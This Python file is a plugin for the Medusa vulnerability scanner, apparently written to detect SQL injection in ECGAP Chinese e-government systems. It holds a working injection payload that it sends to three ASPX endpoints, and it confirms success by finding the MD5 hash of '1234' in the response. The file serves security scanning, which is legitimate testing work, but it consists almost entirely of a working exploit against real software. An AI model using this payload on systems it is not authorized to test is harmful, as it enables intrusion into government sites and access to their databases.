#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
from ClassCongregation import VulnerabilityDetails,WriteFile,ErrorHandling,ErrorLog

class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "KpLi0rn"  # 插件作者
        self.info['create_date']  = "2020-04-08"  # 插件编辑时间
        self.info['disclosure']='2015-10-25'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "ECGAPSQLInjectionVulnerability2"  # 插件名称
        self.info['name'] ='ECGAPSQL注入漏洞' #漏洞名称
        self.info['affects'] = "ECGAP"  # 漏洞组件
        self.info['desc_content'] = "ECGAP电子政务系统多处注入完美绕过"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "无"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果
def medusa(**kwargs)->None:
    url = kwargs.get("Url")  # 获取传入的url参数
    Headers = kwargs.get("Headers")  # 获取传入的头文件
    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
    Payloads = [
                "/Bulletin/ColumnList.aspx?LanMuId=",
                "/ViewSource/SrcFormList.aspx?listType=&infoflowId=",
                "/ViewSource/SrcNotice.aspx?infoflowId="
    ]
    for payload in Payloads:
        try:
            data = "%27and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--"
            payload_url = url + payload + data

            resp = requests.get(payload_url,headers=Headers, proxies=proxies,timeout=6, verify=False)
            con = resp.text
            code = resp.status_code
            if code==200 and con.find("81dc9bdb52d04dc20036dbd8313ed055") != -1 :
                Medusa = "{}存在ECGAPSQL注入漏洞\r\n漏洞地址:{}\r\n漏洞详情:{}\r\n".format(url,payload_url,con)
                _t=VulnerabilityInfo(Medusa)
                VulnerabilityDetails(_t.info, resp, **kwargs).Write()  # 传入url和扫描到的数据
                WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
        except Exception as e:
            _ = VulnerabilityInfo('').info.get('algroup')
            ErrorHandling().Outlier(e, _)
            _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类